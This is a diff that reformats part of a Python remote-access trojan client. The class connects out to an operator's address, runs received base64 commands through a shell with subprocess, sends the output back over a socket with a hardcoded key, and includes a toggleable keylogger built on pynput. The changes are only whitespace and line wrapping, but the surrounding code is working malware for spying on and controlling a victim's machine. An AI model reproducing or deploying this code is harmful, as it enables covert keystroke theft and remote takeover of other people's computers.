@@ -1,19 +1,21 @@
 class CLIENT:
 
     SOCK = None
-    KEY  = ")J@NcRfU"
+    KEY = ")J@NcRfU"
     KEYLOGGER_STATUS = False
     KEYLOGGER_STROKES = ""
 
     def __init__(self, _ip, _pt):
         self.ipaddress = _ip
-        self.port      = _pt
+        self.port = _pt
 
     def send_data(self, tosend, encode=True):
         if encode:
-            self.SOCK.send(base64.encodebytes(tosend.encode('utf-8')) + self.KEY.encode('utf-8'))
+            self.SOCK.send(base64.encodebytes(
+                tosend.encode('utf-8')) + self.KEY.encode('utf-8'))
         else:
-            self.SOCK.send(base64.encodebytes(tosend) + self.KEY.encode('utf-8'))
+            self.SOCK.send(base64.encodebytes(
+                tosend) + self.KEY.encode('utf-8'))
 
     def turn_keylogger(self, status):
         def on_press(key):
@@ -30,7 +32,7 @@ class CLIENT:
             if not self.KEYLOGGER_STATUS:
                 return False
 
-        def logger():            
+        def logger():
             with Listener(on_press=on_press, on_release=on_release) as listener:
                 listener.join()
 
@@ -59,7 +61,8 @@ class CLIENT:
                     self.send_data("Error while changing directory!")
             else:
                 try:
-                    comm = subprocess.Popen(data[1], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+                    comm = subprocess.Popen(
+                        data[1], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                     output, errors = comm.communicate()
                     self.send_data(output + errors)
                 except FileNotFoundError:
@@ -101,14 +104,15 @@ class CLIENT:
 
             if self.KEY.encode('utf-8') in chunk:
                 data = data.rstrip(self.KEY)
-                t = threading.Thread(target=self.execute, args=(base64.decodebytes(data.encode('utf-8')),))
+                t = threading.Thread(target=self.execute, args=(
+                    base64.decodebytes(data.encode('utf-8')),))
                 t.daemon = True
                 t.start()
                 data = ""
 
     def engage(self):
         self.SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        
+
         while True:
             try:
                 print("Connecting To: %s:%d" % (self.ipaddress, self.port))
